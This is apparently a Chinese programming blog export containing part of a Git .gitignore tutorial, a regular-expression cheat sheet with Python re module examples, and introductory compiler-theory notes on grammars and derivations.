忽略操作系统自动生成的文件，比如缩略图等； 忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如Java编译产生的.class文件； 忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。 举个例子： 假设你在Windows下进行Python开发，Windows会自动在有图片的目录下生成隐藏的缩略图文件，如果有自定义目录，目录下就会有Desktop.ini文件，因此你需要忽略Windows自动生成的垃圾文件： 1234567891011121314# Windows:Thumbs.dbehthumbs.dbDesktop.ini# Python:*.py[cod]*.so*.egg*.egg-infodistbuild# My configurations:db.inideploy_key_rsa 最后一步就是把.gitignore也提交到Git，就完成了！当然检验.gitignore的标准是git status命令是不是说working directory clean。 使用Windows的童鞋注意了，如果你在资源管理器里新建一个.gitignore文件，它会非常弱智地提示你必须输入文件名，但是在文本编辑器里“保存”或者“另存为”就可以把文件保存为.gitignore了。 有些时候，你想添加一个文件到Git，但发现添加不了，原因是这个文件被.gitignore忽略了： 1234$ git add App.classThe following paths are ignored by one of your .gitignore files:App.classUse -f if you really want to add them. 如果你确实想添加该文件，可以用-f强制添加到Git： 1$ git add -f App.class 或者你发现，可能是.gitignore写得有问题，需要找出来到底哪个规则写错了，可以用git check-ignore命令检查： 12$ git check-ignore -v App.class.gitignore:3:*.class App.class Git会告诉我们，.gitignore的第3行规则忽略了该文件，于是我们就可以知道应该修订哪个规则。 后续：搭建git服务器]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Regular Expression]]></title>
    <url>%2F2019%2F09%2F22%2Fre%2F</url>
    <content type="text"><![CDATA[正则表达式的规则常用元字符 代码 说明 . 匹配除换行符以外的任意字符 \w 匹配字母或数字或下划线 \s 匹配任意的空白符 \d 匹配数字 \b 匹配单词的开始或结束 ^ 匹配字符串的开始 $ 匹配字符串的结束 常用限定符 代码/语法 说明 * 重复零次或更多次 + 重复一次或更多次 ? 重复零次或一次 {n} 重复n次 {n,} 重复n次或更多次 {n,m} 重复n到m次 常用反义词 代码/语法 说明 \W 匹配任意不是字母，数字，下划线，汉字的字符 \S 匹配任意不是空白符的字符 \D 匹配任意非数字的字符 \B 匹配不是单词开头或结束的位置 [^x] 匹配除了x以外的任意字符 [^aeiou] 匹配除了aeiou这几个字母以外的任意字符 预定义字符集表 \d \d匹配任何十进制数，它相当于类[0-9]，\d+如果需要匹配一位或者多位数的数字时用 \D \D匹配任何非数字字符，它相当于类[^0-9] \s \s匹配任何空白字符，它相当于类[\t\n\r\f\v] \S \S匹配任何非空白字符，它相当于类[^\t\n\r\f\v] \w \w匹配包括下划线在内任何字母数字字符，它相当于类 {a-z,A-Z,0-9,_} \W \W匹配非任何字母数字字符包括下划线在内，它相当于类 { ^a-z,A-Z,0-9,_} \A 仅匹配字符串开头,同^ \Z 仅匹配字符串结尾，同$ \b b匹配一个单词边界，也就是指单词和空格间的位置 \B [^\b] 常用正则表达式 引用：史上最全常用正则表达式大全 一、校验数字的表达式 数字：^[0-9]*$ n位的数字：^\d{n}$ 至少n位的数字：^\d{n,}$ m-n位的数字：^\d{m,n}$ 零和非零开头的数字：^(0|[1-9][0-9]*)$ 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$ 带1-2位小数的正数或负数：^(\-)?\d+(\.\d{1,2})?$ 正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$ 有两位小数的正实数：^[0-9]+(.[0-9]{2})?$ 有1~3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$ 非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$ 非零的负整数：^\-[1-9][]0-9&quot;*$ 或 ^-[1-9]\d*$ 非负整数：^\d+$ 或 ^[1-9]\d*|0$ 非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$ 非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$ 非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$ 正浮点数：^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 负浮点数：^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$ 浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$ 二、校验字符的表达式 汉字：^[\u4e00-\u9fa5]{0,}$ 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$ 长度为3-20的所有字符：^.{3,20}$ 由26个英文字母组成的字符串：^[A-Za-z]+$ 由26个大写英文字母组成的字符串：^[A-Z]+$ 由26个小写英文字母组成的字符串：^[a-z]+$ 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$ 由数字、26个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w{3,20}$ 中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0-9_]+$ 中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0-9]+$或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$ 可以输入含有^%&amp;’,;=?$\”等字符：[^%&amp;&#39;,;=?$\x22]+ 12 禁止输入含有~的字符：[^~\x22]+ 三、特殊需求表达式 Email地址：^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$ 域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.? InternetURL：[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$ 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$ 电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX)：^(\(\d{3,4}-)|\d{3.4}-)?\d{7,8}$ 国内电话号码(0511-4405222、021-87888822)：\d{3}-\d{8}|\d{4}-\d{7} 身份证号(15位、18位数字)：^\d{15}|\d{18}$ 短身份证号码(数字、字母x结尾)：^([0-9]){7,18}(x|X)?$或^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$ 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w{5,17}$ 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)： ^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$ 日期格式：^\d{4}-\d{1,2}-\d{1,2} 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$ 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$ 钱的输入格式： 有四种钱的表示形式我们可以接受:”10000.00” 和 “10,000.00”, 和没有 “分” 的 “10000” 和 “10,000”：^[1-9][0-9]*$ 这表示任意一个不以0开头的数字,但是,这也意味着一个字符”0”不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$ 一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$ 这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 必须说明的是,小数点后面至少应该有1位数,所以”10.”是不通过的,但是 “10” 和 “10.2” 是通过的：^[0-9]+(.[0-9]{2})?$ 这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]{1,2})?$ 这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样： ^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$ 到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须： ^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$ 备注：这就是最终结果了,别忘了”+”可以用”*”替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里 xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$ 中文字符的正则表达式：[\u4e00-\u9fa5] 双字节字符：[^\x00-\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)) 空白行的正则表达式：\n\s*\r(可以用来删除空白行)* HTML标记的正则表达式：&lt;(\S*?)[^&gt;]*&gt;.*?&lt;/\1&gt;|&lt;.*? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力) 首尾空白字符的正则表达式：^\s*|\s*$或 (^\s*)|(\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式) 腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始) 中国邮政编码：[1-9]\d{5}(?!\d) (中国邮政编码为6位数字) IP地址：\d+\.\d+\.\d+\.\d+ (提取IP地址时有用) IP地址：((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)) Python re模块人生苦短，不如Python。 引用：python基础—re模块—正则表达式 python从1.5版本起增加re模块为自带的模块，提供了Perl风格的正则表达式模式 以下是python re库的常用函数 函数 描述 compile(pattern[, flags]) 根据包含正则表达式的字符串创建模式对象 search(pattern, string[, flags]) 在字符串中查找模式 match(pattern, string[, flags]) 在字符串开头匹配模式 split(pattern, string[, maxsplit=0]) 根据模式来分割字符串 findall(pattern, string) 返回一个列表，其中包含字符串中所有与模式匹配的子串 sub(pat, repl, string[, count=0]) 将字符串中与模式pat匹配的子串都替换为repl escape(string) 对字符串中所有的正则表达式特殊字符都进行转义 re.compile() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。语法格式为：re.compile(pattern[, flags])实例&gt;&gt;&gt;import re&gt;&gt;&gt; pattern = re.compile(r'\d+') # 用于匹配至少一个数字&gt;&gt;&gt; m = pattern.match('one12twothree34four') # 查找头部，没有匹配&gt;&gt;&gt; print(m)None&gt;&gt;&gt; m = pattern.match('one12twothree34four', 2, 10) # 从'e'的位置开始匹配，没有匹配&gt;&gt;&gt; print(m)None&gt;&gt;&gt; m = pattern.match('one12twothree34four', 3, 10) # 从'1'的位置开始匹配，正好匹配 &gt;&gt;&gt;print(m) # 返回一个 Match 对象&lt;_sre.SRE_Match object at 0x10a42aac0&gt;&gt;&gt;&gt; m.group(0) # 可省略 0 '12'&gt;&gt;&gt; m.start(0) # 可省略 0 3&gt;&gt;&gt; m.end(0) # 可省略 0 5&gt;&gt;&gt; m.span(0) # 可省略 0 (3, 5)在上面，当匹配成功时返回一个 Match 对象，其中：group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)；start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0；end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0；span([group]) 方法返回 (start(group), end(group))。再看看一个例子：实例&gt;&gt;&gt;import re&gt;&gt;&gt; pattern = re.compile(r'([a-z]+) ([a-z]+)', re.I) # re.I 表示忽略大小写&gt;&gt;&gt; m = pattern.match('Hello World Wide Web')&gt;&gt;&gt; print(m)# 匹配成功，返回一个 Match 对象&lt;_sre.SRE_Match object at 0x10bea83e8&gt;&gt;&gt;&gt; m.group(0) # 返回匹配成功的整个子串 'Hello World'&gt;&gt;&gt; m.span(0) # 返回匹配成功的整个子串的索引 (0, 11)&gt;&gt;&gt; m.group(1) # 返回第一个分组匹配成功的子串 'Hello'&gt;&gt;&gt; m.span(1) # 返回第一个分组匹配成功的子串的索引 (0, 5)&gt;&gt;&gt; m.group(2) # 返回第二个分组匹配成功的子串 'World'&gt;&gt;&gt; m.span(2) # 返回第二个分组匹配成功的子串 (6, 11)&gt;&gt;&gt; m.groups() # 等价于 (m.group(1), m.group(2), ...) ('Hello', 'World')&gt;&gt;&gt; m.group(3) # 不存在第三个分组Traceback (most recent call last):File "&lt;stdin&gt;", line 1, in &lt;module&gt;IndexError: no such group re.search()&amp;re.match() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117re.search 扫描整个字符串并返回第一个成功的匹配。函数语法：re.search(pattern, string, flags=0)函数参数说明：pattern:匹配的正则表达式string:要匹配的字符串。flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 匹配成功re.search方法返回一个匹配的对象，否则返回None。我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。匹配对象方法group(num=0):匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。groups():返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。实例import reline = "Cats are smarter than dogs";searchObj = re.search( r'(.*) are (.*?) .*', line, re.M|re.I)if searchObj: print ("searchObj.group() : ", searchObj.group()) print ("searchObj.group(1) : ", searchObj.group(1)) print ("searchObj.group(2) : ", searchObj.group(2))else: print( "Nothing found!!")以上实例执行结果如下：searchObj.group() : Cats are smarter than dogssearchObj.group(1) : CatssearchObj.group(2) : smarter _____________________________________________________________________________re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。函数语法：re.match(pattern, string, flags=0)函数参数说明：（同re.search一样）匹配成功re.match方法返回一个匹配的对象，否则返回None。我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。匹配对象方法：（同re.search一样）实例import reprint(re.match('www', 'www.runoob.com').span()) # 在起始位置匹配print(re.match('com', 'www.runoob.com')) # 不在起始位置匹配以上实例运行输出结果为：(0, 3) None实例import reline = "Cats are smarter than dogs"matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I)if matchObj: print("matchObj.group() : ", matchObj.group()) print("matchObj.group(1) : ", matchObj.group(1)) print("matchObj.group(2) : ", matchObj.group(2))else: print("No match!!")以上实例执行结果如下：matchObj.group() : Cats are smarter than dogsmatchObj.group(1) : CatsmatchObj.group(2) : smarter ____________________________________________________________________________re.match与re.search的区别:re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。实例import reline = "Cats are smarter than dogs";matchObj = re.match( r'dogs', line, re.M|re.I)if matchObj: print("match --&gt; matchObj.group() : ", matchObj.group())else: print ("No match!!")matchObj = re.search( r'dogs', line, re.M|re.I)if matchObj: print("search --&gt; matchObj.group() : ", matchObj.group())else: print("No match!!")以上实例运行结果如下：No match!!search --&gt; matchObj.group() : dogs re.split() 12345678910111213141516171819202122232425split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：re.split(pattern, string[, maxsplit=0, flags=0])参数:pattern:匹配的正则表达式string:要匹配的字符串。maxsplit:分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。实例&gt;&gt;&gt;import re&gt;&gt;&gt; re.split('\W+', 'runoob, runoob, runoob.')['runoob', 'runoob', 'runoob', '']&gt;&gt;&gt; re.split('(\W+)', ' runoob, runoob, runoob.')['', ' ', 'runoob', ', ', 'runoob', ', ', 'runoob', '.', '']&gt;&gt;&gt; re.split('\W+', ' runoob, runoob, runoob.', 1)['', 'runoob, runoob, runoob.']&gt;&gt;&gt; re.split('a*', 'hello world') # 对于一个找不到匹配的字符串而言，split 不会对其作出分割['hello world'] re.sub() 123456789101112131415161718192021222324252627282930313233343536373839404142Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。语法:re.sub(pattern, repl, string, count=0, flags=0)参数：pattern : 正则中的模式字符串。repl : 替换的字符串，也可为一个函数。string : 要被查找替换的原始字符串。count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。 实例:import rephone = "2004-959-559 # 这是一个国外电话号码"num = re.sub(r'#.*$', "", phone) # 删除字符串中的 Python注释print ("电话号码是: ", num)num = re.sub(r'\D', "", phone) # 删除非数字(-)的字符串print ("电话号码是 : ", num)以上实例执行结果如下：电话号码是: 2004-959-559电话号码是 : 2004959559 以下实例中将字符串中的匹配的数字乘以 2：import redef double(matched): # 将匹配的数字乘以 2 value = int(matched.group('value')) return str(value * 2)s = 'A23G4HFD567'print(re.sub('(?P&lt;value&gt;\d+)', double, s))执行输出结果为：A46G8HFD1134 findall() 1234567891011121314151617181920212223242526在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。注意： match 和 search 是匹配一次,findall 匹配所有。语法格式为：findall(string[, pos[, endpos]])参数：string: 待匹配的字符串。pos: 可选参数，指定字符串的起始位置，默认为 0。endpos: 可选参数，指定字符串的结束位置，默认为字符串的长度。查找字符串中的所有数字：实例import repattern = re.compile(r'\d+') # 查找数字result1 = pattern.findall('runoob 123 google 456')result2 = pattern.findall('run88oob123google456', 0, 10) #取字符串之中0-10之间的数字出来print(result1，result2)输出结果：['123', '456']，['88', '12'] re.finditer() 1234567891011121314151617181920和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。re.finditer(pattern, string, flags=0)参数:pattern:匹配的正则表达式string:要匹配的字符串。flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。实例import reit = re.finditer(r"\d+","12a32bc43jf3")for match in it: print (match.group() )输出结果：12 32 43 3 re.escape() re.escape()的主要作用就是将一个字符串变成可以匹配的正则表达式 12345re.escape是一个工具函数，用于对字符串中所有可能被视为正则表达式运算符的字符进行转义。使用这个函数的情况有：字符串很长，其中包含大量特殊字符，而你不想输入大量的反斜杠；你从用户那里获取了一个字符串（例如，通过函数input），想将其用于正则表达式中。下面的示例说明了这个函数的工作原理：&gt;&gt;&gt; re.escape('www.python.org') 'www\\.python\\.org' &gt;&gt;&gt; re.escape('But where is the ambiguity?') 'But\\ where\\ is\\ the\\ ambiuity\\?']]></content>
      <categories>
        <category>re</category>
      </categories>
      <tags>
        <tag>Re</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Compiler]]></title>
    <url>%2F2019%2F09%2F04%2FCompiler%2F</url>
    <content type="text"><![CDATA[一、引论编译原理是良好的数学基础和好的工程结构功能的结合。 Compiler：编译，述而不作，忠于编写的东西 编译器从逻辑上可以分成若干阶段，每个阶段把源程序从一种表示变换成另一种表示 1.1什么叫编译程序翻译器（翻译程序）：Translater 能将一种语言程序（源语言程序）转换成另一种等价的语言程序（目标语言程序） 编译器（编译程序）：Compiler 能将一种计算机高级语言程序（源语言程序）转换成另一种等价的计算机低级语言程序（目标语言程序） 解释器（解释程序）：Interpreter 也是一种翻译程序，以一种语言写的源程序作为输入，但不产生目标代码，而是边解释边执行 解释器和编译器的区别： ①编译分成两步完成：先翻译，在运行 ②解释只用一步就完成：边解释边执行 可变目标编译程序（Retargetable Compiler） 交叉编译程序（Cross Compiler） 1.2编译程序的组成 词法分析器：读入组成源程序的字符流，并将它们组织成为有意义的词素的序列 语法分析器：使用由词法分析器生成的各个词法单元的第一个分量来创建树形的中间表示，该中间表示给出了词法分析产生的词法单元流的语法结构。一个常用的表示方法便是语法树，树中的每个内部节点表示一个运算 语义分析器：使用语法树和符号表中的信息来检查源程序是否和语言定义的语义一致。同时也收集类型信息，并把这些信息存放在语法树或符号表中，以便在随后的中键代码生成过程中使用。 中间代码生成器：在把一个源程序翻译成目标代码的过程中，一个编译器可能构造出一个或多个中间表示。这些中间表示可以有多种形式。比如语法树是一种中间表示形式，通常在语法分析和语义分析中使用。 代码优化器：机器无关的代码优化步骤试图改进中间代码，以便生成更好的目标代码 代码生成器：代码生成器以源程序的中间表示形式作为输入，并把它映射到目标语言。 符号表管理器：记录源程序中使用的变量的名字，并收集和每个名字的各种属性有关的信息。 Tips: 如何学习构造编译程序 （1）源语言，对被编译的源程序深刻理解其结构和含义 （2）目标语言，假定目标语言是机器语言，就必须搞清楚硬件的系统结构和操作系统的功能 （3）编译方法，把一种语言翻译成另一种语言的方法很多，重点 二、高级语言及其语法描述2.1程序语言的语法和语义2.1.1语法任何语言均可作一个集合。这个集合中的每个元素都是在一定符号集（字母表）上的一个符号串。 对于自然语言来说，他们是定义在某个字母表上的句子的集合 对于程序语言来说，他们也是定义在某个字母表上的句子的集合。这里的句子，就是一个源程序。 词法规则：单词符号是语言中具有独立意义的最基本单位。语言的单词符号是由词法规则所确定的，即词法规则规定了单词符号的形成规则。 语法规则：上下文无关文法或BNF（Backus-Naur范式） 2.1.2语义语义，定义程序的意义 没有公认的形式系统描述语义 2.2程序语言的一般特征高级语言的分类 强制性语言（Imperative Language）|过程式语言：Fortran，C，Pascal 应用式语言（Applicative Language）|函数式语言：LISP 基于规则的语言（Ruled-based Language）：Prolog 面向对象语言（Object-oriented Language）：JAVA，c++ 2.3程序语言的语法描述一、字母表和符号串 字母表：符号的非空有限集合 例：∑ ={a，b，c} 符号：字母表中的元素 例： a，b，c 符号串：符号的有穷序列 例：a, aa, ac, abc，.. 空符号串：无任何符号的符号串( ε ) 符号串集合：由符号串构成的集合。 符号串的形式定义 有字母表∑，定义： （1）ε是∑上的符号串； （2）若x是∑上的符号串，且a∈ ∑，则ax或xa是 ∑ 上的符号串； （3）y是∑上的符号串，iff（当且仅当）y可由（1）和（2）产生。 二、符号串和符号串集合的运算符号串相等：若x、y是集合上的两个符号串，则x＝y，iff（当且仅当）组成x的每一个符号和组成y的每一个符号依次相等。 符号串的长度：若x为符号串，其长度|x|等于组成该符 号串的符号个数。（例：x＝STV， |x|=3） 符号串的连接：若x、y是定义在Σ是上的符号串，且x＝XY，y＝YX，则x和y的连接 xy ＝ XYYX也是Σ上的符号串。（注意：一般xy ≠ yx，但是εx = xε） 符号串集合的乘积运算：令A、B为符号串集合，定义AB＝{ xy | x∈A, y∈B} 符号串集合的幂运算：有符号串集合A，定义A0 ={ε}, A1=A, A2=AA, A3=AAA,…… ……, An＝An-1A=AAn-1 ，n&gt;0 符号串集合的闭包运算：设A是符号串集合，定义 A＋＝ A1 ∪ A2 ∪ A3 ∪……∪ An ∪…… 称为集合A的正则闭包。A*＝ A0 ∪A＋ 称为集合A的闭包。（A0 = { ε } ） 为什么对符号、符号串、符号串集合以及它们的运算感兴趣？ 若A为某语言的基本字符集 ​ A＝{a,b,……z,0,1,……,9, +,－,×,_/, ( , ), =……} B为单词集 ​ B ={begin, end, if, then,else,for,……,&lt;标识符&gt;,&lt;常量&gt;,……} 则B ⊂ A* 。 语言的句子是定义在B上的符号串。 若令C为句子集合，则C ⊂ B* , 程序 ⊂ C 三、文法的直观理解1.什么是文法：文法是对语言结构的定义与描述。即从形式上用于描述和规定语言结构的称为“文法”（或称为“语法”）。 2.语法规则：我们通过建立一组规则（产生式），来描述句子的语法结构。规定用“::=”表示“由……组成“。 例如： &lt;句子&gt;::=&lt;主语&gt;&lt;谓语&gt; &lt;主语&gt;::=&lt;代词&gt;|&lt;名词&gt; &lt;代词&gt; ::=你|我|他 &lt;名词&gt;::= 王民|大学生|工人|英语 &lt;谓语&gt;::=&lt;动词&gt;&lt;直接宾语&gt; &lt;动词&gt;::=是|学习 &lt;直接宾语&gt;::=&lt;代词&gt;|&lt;名词&gt; 3.由产生式推导句子：3.有了一组产生式之后，可以按照一定的方式用它们去推导或产生句子。 ​ 推导方法：从一个要识别的符号开始推导，即用相应产生式的右部来替代产生式的左部，每次仅用一条产生式去进行推导。 &lt;句子&gt; =&gt; &lt;主语&gt;&lt;谓语&gt; &lt;主语&gt;&lt;谓语&gt; =&gt; &lt;代词&gt;&lt;谓语&gt; …… …… 这种推导一直进行下去，直到所有带&lt; &gt;的符号都由终结符号替代为止。 说明：有若干语法成分同时存在时，我们总是从最左的语法成分进行推导，这称之为最左推导，类似的有最右推导（一般推导）。 文法实在形式上对句子结构的定义与描述，而未涉及语义问题 4.语法树 一般用语法树来描述一个句子的语法结构。 四、文法和语言的形式定义1.文法的定义定义1: 文法 G =（VN，VT，P，Z） ​ VN ： 非终结符号集​ VT ： 终结符号集​ P： 产生式或规则的集合​ Z： 开始符号（识别符号） Z∈VN 产生式：产生式是一个有序对(U, x), 通常写为: ​ U ::= x 或U ➡ x； |U| = 1 |x| &gt;= 0 非终结符号：出现在产生式的左部,且能推出符号或符号串的那些符号。其全体构成非终结符号集，记为VN 终结符号：不出现在产生式的左部,且不能推出符号或符号串的那些符号。其全体构成终结符号集，记为VT 12345678910无符号整数的文法:G[&lt;无符号整数&gt;]=（VN，VT，P，Z） VN＝&#123;&lt;无符号整数&gt;, &lt;数字串&gt;, &lt;数字&gt;&#125; VT = &#123;0,1,2,3,4,5,6,7,8,9&#125; P = &#123;&lt;无符号整数&gt; → &lt;数字串&gt; ; &lt;数字串&gt; → &lt;数字串&gt; &lt;数字&gt; ; &lt;数字串&gt; → &lt;数字&gt; ; &lt;数字&gt; →0; &lt;数字&gt; →2; &lt;数字&gt; →3; &lt;数字&gt; →4; &lt;数字&gt; →5; &lt;数字&gt; →6; &lt;数字&gt; →7; &lt;数字&gt; →8; &lt;数字&gt; →9; &#125; Z = &lt;无符号整数&gt;; 注：产生式左边符合构成集合VN，且Z ∈ VN ​ 有些产生式有相同的左部，可以合在一起 ​ 给定一个文法，实际上只需给出产生式的集合，并指定识别符号（开始符号） 2.推导与归约定义2：直接推导： 有文法G：v = xUy，w = xuy，其中x、y∈V*，U∈VN，u∈V*， 若U ::= u∈P，则v &rArr; w， 若 x = y = ε ， 有 U ::= u， 则U &rArr; u x和y是符号串，若使用一次产生式可以从x变换出y，则称x直接推导出y(或者说y是x的直接推导），记为x&rArr;y。 定义3： +推导：x和y是符号串，若使用若干次产生式可以从x变换出y，则称x推导出y(或者说y是x的推导），记为x =+=&rArr;y。 即，若有直接推导序列：x=U0==&gt;U1==&gt;U2==&gt;……==&gt;Un=y,则 x=+=&gt;y 。 定义4：*推导：x和y是符号串，若使用0次或若干次产生式可以从x变换出y，则称x推导出y(或者说y是x的推导），记为x=*=&gt;y。 如：N=*=&gt;N， N=*=&gt;109 定义5：最右推导&amp;最左推导 最右推导：若符号串α中有两个以上的非终结符时，对推导的每一步坚持把α中的最右非终结符进行替换，称为最右推导。 最左推导：若符号串α中有两个以上的非终结符时，对推导的每一步坚持把α中的最左非终结符进行替换，称为最左推导。 ！！！规范推导＝最右推导 定义6：推导的逆过程为归约 x==&gt;y，可称为x直接推导出y，也可称为y直接归约出x 3.语言的形式定义定义7：文法G[Z] ​ （1）句型：x是句型 &hArr; Z =*=&gt;x,且 x∈V*； ​ （2）句子：x是句子 &hArr; Z =+=&gt; x, 且 x∈VT*； ​ （3）语言：L（G[Z]）={x| Z=+=&gt;x， x∈VT* }；（文法G[z]产生的所有句子的集合） 定义8：G和G’是两个不同的文法，若L(G) = L(G’)，则G和G’为等价文法 编译感兴趣的问题如下 给定终极符x，文法G，求x ∈ L(G)？ 4.文法分类 形式语言：用文法和自动机所描述的没有语义的语言 语言定义： L(G[Z]) = { x | Z=+=&gt;x，x∈VT* } 文法定义：乔姆斯基将所有文法定义为一个四元组：G = （VN，VT，P，Z） VN ： 非终结符号集VT ： 终结符号集P： 产生式或规则的集合Z： 开始符号（识别符号） Z∈VN 文法和语言的分类：0型、1型、2型、3型 定义9： 0型文法 P： u &rarr; v ，其中 u ∈ V+，v ∈ V* 0型文法称为短语结构文法。产生式的左部和右部都可以是符号串，一个短语可以产生另一个短语。 0型语言：L0，这种语言可以用图灵机（Turing）接受 定义10：1型文法 P： xUy &rarr; xuy ，其中 U ∈VN，x、y、u ∈ V* 1型文法称为上下文有关或上下文敏感。即只有在x、y这样的上下文中才能将U改写为u 1型语言：L1，这种语言可以有一种线性界限自动机接受 定义11：2型文法 P： U &rarr; u ，其中 U ∈ VN ，u ∈ V* 2型文法称为上下文无关文法。即把U改写为u时，不必考虑上下文。 注意：2型文法与BNF表示相等价。 2型语言：L2，这种语言可以由下推自动机接受 定义12：3型文法 （左线型） P： U &rarr; T | U &rarr; wT ，其中 U、w ∈ VN ，T ∈ VT （右线性）P： U &rarr; T | U &rarr; Tw ，其中 U、w ∈ VN ，T ∈ VT 3型文法称为正则文法。它是对2型文法进行进一步的限制 3型语言：L3，又称正则语言、正则集合，这种语言可以由有穷自动机接受 由上易知， L0 &sup; L1 &sup; L2 &sup; L3 0型文法可以产生L0、L1、L2、L3，但2型文法只能产生L2，不能产生L1 5.语法树与二义性文法1.推导与语法树 语法树：句子结构的图示表示法，通常表示称一棵倒立的树，即 结点： 符号 根节点： 识别符号 中间节点：非终结符 叶节点： 终结符或非终结符 边：表示节点间的派生关系 句型的推导及语法树的生成（自顶向下） 给定G[Z]，句型w：可建立推导序列，Z =*=&gt; w；可建立语法树，以Z为树根节点，每步推导生成语法树的一枝，最终可生成句型的语法树。 